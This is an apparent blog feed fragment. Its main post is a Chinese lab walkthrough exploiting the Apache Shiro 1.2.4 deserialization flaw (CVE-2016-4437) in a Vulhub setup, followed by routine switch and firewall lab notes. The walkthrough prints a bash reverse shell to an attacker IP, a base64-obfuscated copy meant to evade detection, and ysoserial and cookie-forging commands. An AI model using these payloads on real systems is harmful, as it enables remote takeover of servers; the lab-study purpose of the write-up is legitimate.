&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python2 shiro_exploit.py -t 3 -u 192.168.100.134:8080 -p &amp;quot;ping -c 4 4kp8lyr2idc6mwiqvjbvs6yeh5nvbk.burpcollaborator.net&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418185442068.png&#34; alt=&#34;image-20240418185442068&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;&lt;a href=&#34;#漏洞利用&#34; class=&#34;headerlink&#34; title=&#34;漏洞利用&#34;&gt;&lt;/a&gt;漏洞利用&lt;/h2&gt;&lt;p&gt;目标任务：构造cookie获取反弹shell&lt;/p&gt;
&lt;p&gt;nc开启监听，nc -lvvp 6666&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418170744863.png&#34; alt=&#34;image-20240418170744863&#34;&gt;&lt;/p&gt;
&lt;p&gt;构造反弹shell的命令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.100.131/6666 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;命令中包含重定向 ’ &amp;lt; ’ ’ &amp;gt; ’ 和管道符 ’ | ’ 时，需要进行 base64 编码绕过检测。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;利用序列化工具ysoserial.jar生成payload，并配置监听功能&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections5 &amp;quot;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这里相当于在攻击机上启动了一个VPS服务，监听7777端口，然后在这个服务上放了一个反弹shell的payload，并用序列化工具ysoserial指定利用链生成可执行bash -i &amp;gt;&amp;amp; &amp;#x2F;dev&amp;#x2F;tcp&amp;#x2F;192.168.200.131&amp;#x2F;6666 0&amp;gt;&amp;amp;1命令的序列化数据payload。当后面有客户端请求服务时，我们搭建的这个JRMP就会返回这段payload。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418183402795.png&#34; alt=&#34;image-20240418183402795&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果不配置此项的话，直接连接，会出现如下情况，无法成功获取shell&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418183458178.png&#34; alt=&#34;image-20240418183458178&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用脚本构造出cooikie信息&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python2 shiro.py 192.168.100.131:7777&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418171624073.png&#34; alt=&#34;image-20240418171624073&#34;&gt;&lt;/p&gt;
&lt;p&gt;BP抓包（勾选remember选项），加入将生成的内容加入到cookie中并发送&lt;/p&gt;
&lt;p&gt;注意要将cookie中原有的内容删去，再添加构造的内容作为cookie发送&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20174103.png&#34; alt=&#34;屏幕截图 2024-04-18 174103&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后回到kali发现获取到了shell&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418174311802.png&#34; alt=&#34;image-20240418174311802&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418174424393.png&#34; alt=&#34;image-20240418174424393&#34;&gt;&lt;/p&gt;
&lt;p&gt;也可以nc开启监听后，直接进行如下命令（脚本将上面的步骤整合到一起了），同样能够获取shell&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python2 shiro_exploit.py -t 3 -u 192.168.100.134:8080 -p &amp;quot;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418185029472.png&#34; alt=&#34;image-20240418185029472&#34;&gt;&lt;/p&gt;
&lt;p&gt;或直接工具进行漏洞利用&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223333.png&#34; alt=&#34;屏幕截图 2024-04-18 223333&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418231659688.png&#34; alt=&#34;image-20240418231659688&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223718.png&#34; alt=&#34;屏幕截图 2024-04-18 223718&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223753.png&#34; alt=&#34;屏幕截图 2024-04-18 223753&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;过程中遇见的问题以及解决方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;总体上，就是脚本运行的环境问题，环境不适配导致一系列报错&lt;/p&gt;
&lt;p&gt;首先，需要pyhton2版本，包括pip2，在kali上装pip2可以，先访问网址&lt;a href=&#34;https://bootstrap.pypa.io/pip/2.7/get-pip.py%EF%BC%8C%E8%8E%B7%E5%8F%96get-pip.py%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%B0%86%E4%B8%8B%E8%BD%BD%E5%A5%BD%E7%9A%84get-pip.py%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%88%B0Kali%E4%B8%8A%E3%80%82%E5%9C%A8Kali%E7%BB%88%E7%AB%AF%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8python2%E6%89%A7%E8%A1%8Cget-pip.py%E6%96%87%E4%BB%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9Asudo&#34;&gt;https://bootstrap.pypa.io/pip/2.7/get-pip.py，获取get-pip.py文件内容，将下载好的get-pip.py文件传输到Kali上。在Kali终端中，使用python2执行get-pip.py文件，命令如下：sudo&lt;/a&gt; python2 get-pip.py即可。运行脚本时报错No module named ‘Crypto’，则运行如下命令：pip2 install pycryptodome，（还有问题可以尝试卸载重装该模块，即pip uninstall与install），然后使用pyhton2运行脚本即可。&lt;/p&gt;
&lt;p&gt;然后就是java的版本过高，工具无法正常使用（需要java8版本），可以参考文章&lt;a href=&#34;https://blog.csdn.net/huayimy/article/details/130273362&#34;&gt;https://blog.csdn.net/huayimy/article/details/130273362&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;知识点补充：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;内存马&lt;/p&gt;
&lt;p&gt;普通的木马是写入一个文件去访问,恶意代码是依靠于文件的，执行后就会在内存中被释放掉，但是内存马是依赖于程序本身的动态注册,会在内存中进行一个保存,视为程序的一部分.实现脱离文件后依旧可以运行。&lt;/p&gt;
&lt;p&gt;JRMP&lt;/p&gt;
&lt;p&gt;Java远程方法协议（Java Remote Method Protocol，JRMP），适用于RMI过程中的协议，只有使用这个协议，方法调用双方才能正常进行数据交流。&lt;/p&gt;
&lt;p&gt;RMI&lt;/p&gt;
&lt;p&gt;远程方法调用(Remote Method Invocation)。远程调用服务器上对象的一种接口。能够让在某个java虚拟机上的对象像调用本地对象一样调用另一个java 虚拟机中的对象上的方法。&lt;/p&gt;
&lt;p&gt;参考文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Bossfrank/article/details/130173880&#34;&gt;https://blog.csdn.net/Bossfrank/article/details/130173880&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/372862.html&#34;&gt;https://www.freebuf.com/articles/web/372862.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_44159028/article/details/115290013&#34;&gt;https://blog.csdn.net/qq_44159028/article/details/115290013&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/huayimy/article/details/130273362&#34;&gt;https://blog.csdn.net/huayimy/article/details/130273362&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/379047.html&#34;&gt;https://www.freebuf.com/articles/web/379047.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Candyys/article/details/106038761&#34;&gt;https://blog.csdn.net/Candyys/article/details/106038761&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://ares-x.com/tools/runtime-exec&#34;&gt;https://ares-x.com/tools/runtime-exec&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/04/16/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/</guid>
            <title>网基实践题-链路聚合</title>
            <link>https://w-sqrt7.github.io/2024/04/16/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/</link>
            <category>原创</category>
            <category>网基</category>
            <category>eNSP</category>
            <pubDate>Tue, 16 Apr 2024 11:39:01 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;网基实践题-链路聚合&#34;&gt;&lt;a href=&#34;#网基实践题-链路聚合&#34; class=&#34;headerlink&#34; title=&#34;网基实践题-链路聚合&#34;&gt;&lt;/a&gt;网基实践题-链路聚合&lt;/h1&gt;&lt;h2 id=&#34;实验拓扑图：&#34;&gt;&lt;a href=&#34;#实验拓扑图：&#34; class=&#34;headerlink&#34; title=&#34;实验拓扑图：&#34;&gt;&lt;/a&gt;实验拓扑图：&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/2024/04/16/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-16%20111917.png&#34; alt=&#34;屏幕截图 2024-04-16 111917&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;实验过程：&#34;&gt;&lt;a href=&#34;#实验过程：&#34; class=&#34;headerlink&#34; title=&#34;实验过程：&#34;&gt;&lt;/a&gt;实验过程：&lt;/h2&gt;&lt;p&gt;1.配置pc机的ip网关等&lt;/p&gt;
&lt;p&gt;这里不在赘述&lt;/p&gt;
&lt;p&gt;2.在SW1和SW2上进行基础配置&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[SW1]vlan batch 10 20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1]int e0/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1-Ethernet0/0/1]port link-type access&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1-Ethernet0/0/1]port default vlan 10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1-Ethernet0/0/1]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1]int e0/0/2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1-Ethernet0/0/2]port link-type access&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1-Ethernet0/0/2]port default vlan 20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1-Ethernet0/0/2]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[SW2]vlan batch 10 20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2]int vlanif 10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2-Vlanif10]ip address 192.168.10.254 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2-Vlanif10]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2]int vlanif 20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2-Vlanif20]ip address 192.168.20.254 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2-Vlanif20]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;3.进行链路聚合配置&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[SW1]int Eth-Trunk 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1-Eth-Trunk1]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1]int e0/0/5	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1-Ethernet0/0/5]eth-trunk 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1-Ethernet0/0/5]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1]int e0/0/6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1-Ethernet0/0/6]eth-trunk 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1-Ethernet0/0/6]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[SW2]int Eth-Trunk 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2-Eth-Trunk1]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2]int e0/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2-Ethernet0/0/1]eth-trunk 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2-Ethernet0/0/1]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2]int e0/0/4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2-Ethernet0/0/4]eth-trunk 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2-Ethernet0/0/4]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[SW1]int Eth-Trunk 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1-Eth-Trunk1]port link-type trunk&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1-Eth-Trunk1]port trunk allow-pass vlan 10 20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW1-Eth-Trunk1]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[SW2]int Eth-Trunk 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2-Eth-Trunk1]port link-type trunk&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2-Eth-Trunk1]port trunk allow-pass vlan 10 20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[SW2-Eth-Trunk1]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;然后进行测试，结果为两台主机之间可以互相ping通&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/</guid>
            <title>网基实践题-防火墙配置</title>
            <link>https://w-sqrt7.github.io/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/</link>
            <category>原创</category>
            <category>网基</category>
            <category>eNSP</category>
            <pubDate>Thu, 11 Apr 2024 19:32:04 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;网基实践题-防火墙配置&#34;&gt;&lt;a href=&#34;#网基实践题-防火墙配置&#34; class=&#34;headerlink&#34; title=&#34;网基实践题-防火墙配置&#34;&gt;&lt;/a&gt;网基实践题-防火墙配置&lt;/h1&gt;&lt;h2 id=&#34;实验拓扑图一：&#34;&gt;&lt;a href=&#34;#实验拓扑图一：&#34; class=&#34;headerlink&#34; title=&#34;实验拓扑图一：&#34;&gt;&lt;/a&gt;实验拓扑图一：&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240411185710090.png&#34; alt=&#34;image-20240411185710090&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;实验过程：&#34;&gt;&lt;a href=&#34;#实验过程：&#34; class=&#34;headerlink&#34; title=&#34;实验过程：&#34;&gt;&lt;/a&gt;实验过程：&lt;/h2&gt;&lt;p&gt;1.首先配置云(cloud1)，根据自己的虚拟网卡配置，具体操作参考下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-11%20185831.png&#34; alt=&#34;屏幕截图 2024-04-11 185831&#34;&gt;&lt;/p&gt;
&lt;p&gt;2.然后配置防火墙，首先配本地访问的端口&lt;/p&gt;
